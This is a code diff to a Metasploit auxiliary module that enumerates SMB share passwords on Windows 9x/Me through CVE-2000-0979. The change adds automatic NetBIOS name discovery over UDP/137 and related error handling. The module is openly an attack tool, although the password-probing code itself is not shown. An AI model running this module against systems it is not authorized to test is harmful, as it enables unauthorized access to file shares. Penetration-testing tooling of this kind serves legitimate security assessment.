@@ -48,7 +48,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptInt.new('DELAY', [false, 'Add delay between password probes', 0]),
         Opt::RPORT(139),
-        OptString.new('SMBName', [true, 'NetBIOS name of the target Win9x/Me machine', nil])
+        OptString.new('SMBName', [false, 'NetBIOS name of the target Win9x/Me machine (auto-discovered via NBNS node status if unset)', nil])
       ]
     )
   end
@@ -56,6 +56,13 @@ class MetasploitModule < Msf::Auxiliary
   def run
     delay = datastore['DELAY']
     print_status('Starting CVE-2000-0979 SMB Share Password Enumerator')
+
+    smb_name = datastore['SMBName'].presence || discover_netbios_name
+    if smb_name.blank?
+      print_error('Could not determine the target NetBIOS name; set SMBName manually')
+      return
+    end
+    datastore['SMBName'] = smb_name
 
     # Phase 1: Connect and enumerate shares via RAP
     connect(versions: [1], backend: :ruby_smb, direct: false)
@@ -95,6 +102,39 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   private
+
+  # Look up the target's NetBIOS file-server name (suffix 0x20) via an NBNS
+  # node status query on UDP/137. Win9x/Me reject the *SMBSERVER wildcard in
+  # the port 139 session request, so the real NetBIOS name is required to
+  # establish a session when SMBName is left unset.
+  #
+  # Win9x/Me send the node status reply to UDP destination port 137 regardless
+  # of the query's source port, so the query socket must be bound to local port
+  # 137 to receive the response. Binding a privileged port requires root.
+  def discover_netbios_name
+    unless Process.uid == 0
+      print_error('NBNS auto-discovery must bind local UDP port 137, which requires root; run as root or set SMBName manually')
+      return nil
+    end
+
+    ip = Rex::Socket.getaddress(rhost)
+    print_status("SMBName not set; querying #{ip} for its NetBIOS name (UDP/137)")
+    sock = Rex::Socket::Udp.create(
+      'LocalPort' => 137,
+      'Context' => { 'Msf' => framework, 'MsfExploit' => self }
+    )
+    name = RubySMB::Nbss::NodeStatus.file_server_name(ip, udp_socket: sock)
+    print_good("Discovered NetBIOS name: #{name}") if name
+    name
+  rescue Errno::EACCES, Errno::EADDRINUSE => e
+    print_error("Could not bind local UDP port 137 (#{e.class}); free it or set SMBName manually")
+    nil
+  rescue ArgumentError => e
+    print_error("NBNS node status query failed: #{e}")
+    nil
+  ensure
+    sock&.close
+  end
 
   def enum_shares_rap
     shares = []
